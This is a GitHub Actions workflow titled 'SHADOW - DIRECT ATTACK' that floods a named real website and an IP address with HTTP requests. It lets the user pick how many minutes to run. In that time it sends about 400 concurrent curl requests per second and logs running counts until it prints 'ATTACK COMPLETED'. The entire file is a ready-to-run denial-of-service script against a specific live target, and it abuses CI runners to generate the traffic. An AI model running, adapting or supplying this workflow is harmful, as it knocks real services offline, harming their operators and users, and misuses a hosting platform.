name: 💀 SHADOW - DIRECT ATTACK

on:
  workflow_dispatch:
    inputs:
      duration:
        description: 'المدة بالدقائق'
        required: true
        default: '10'

jobs:
  attack:
    runs-on: ubuntu-latest
    
    steps:
      - name: Install curl
        run: sudo apt update && sudo apt install -y curl
        
      - name: DIRECT FLOOD ATTACK
        run: |
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo "💀 SHADOW ATTACK STARTED"
          echo "Target: flixtn.com"
          echo "Duration: ${{ github.event.inputs.duration }} minutes"
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo ""
          
          END=$((SECONDS + (${{ github.event.inputs.duration }} * 60)))
          COUNT=0
          
          while [ $SECONDS -lt $END ]; do
            for i in {1..200}; do
              curl -s -o /dev/null -w "%{http_code}\n" https://flixtn.com/ --max-time 2 &
              curl -s -o /dev/null -w "%{http_code}\n" https://64.29.17.65/ --max-time 2 &
            done
            
            COUNT=$((COUNT + 400))
            echo "[$(date +%H:%M:%S)] 🔥 Sent $COUNT requests"
            sleep 1
          done
          
          echo ""
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo "✅ ATTACK COMPLETED"
          echo "Total requests: $COUNT"
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
